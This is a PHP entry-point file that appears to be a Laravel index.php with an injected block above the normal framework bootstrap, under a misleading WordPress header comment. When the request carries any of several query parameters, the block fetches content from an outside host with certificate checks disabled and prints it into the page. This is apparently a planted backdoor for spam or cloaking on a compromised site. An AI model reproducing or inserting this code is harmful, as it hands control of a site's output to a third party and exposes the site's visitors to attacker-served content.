<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
function fetchDataFromSite($site) {
    $ch = curl_init($site);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if(isset($_GET['go'])) {
    $sitex = $_GET['go'];
    $site = 'https://replication2.pkcdurensawit.net/belivit/?go='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['ref'])) {
    $sitex = $_GET['ref'];
    $site = 'https://replication2.pkcdurensawit.net/belivit/?ref='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['web'])) {
  $sitex = $_GET['web'];
  $site = 'https://replication2.pkcdurensawit.net/belivit/?web='.$sitex;
  $data = fetchDataFromSite($site);
  echo $data;
}

elseif(isset($_GET['top'])) {
  $sitex = $_GET['top'];
  $site = 'https://replication2.pkcdurensawit.net/belivit/?top='.$sitex;
  $data = fetchDataFromSite($site);
  echo $data;
}
	elseif(isset($_GET['vip'])) {
  $sitex = $_GET['vip'];
  $site = 'https://replication2.pkcdurensawit.net/belivit/?vip='.$sitex;
  $data = fetchDataFromSite($site);
  echo $data;
}
elseif(isset($_GET['sites'])) {
    $sitex = $_GET['sites'];
    $site = 'https://replication2.pkcdurensawit.net/belivit/?sites='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
	
} else {
?>

<?php

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| our application. We just need to utilize it! We'll simply require it
| into the script here so that we don't have to worry about manual
| loading any of our classes later on. It feels great to relax.
|
*/

require __DIR__.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Turn On The Lights
|--------------------------------------------------------------------------
|
| We need to illuminate PHP development, so let us turn on the lights.
| This bootstraps the framework and gets it ready for use, then it
| will load up this application so that we can run it and send
| the responses back to the browser and delight our users.
|
*/

$app = require_once __DIR__.'/../bootstrap/app.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request
| through the kernel, and send the associated response back to
| the client's browser allowing them to enjoy the creative
| and wonderful application we have prepared for them.
|
*/

$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);

$response = $kernel->handle(
    $request = Illuminate\Http\Request::capture()
);

$response->send();

$kernel->terminate($request, $response);


}
?>
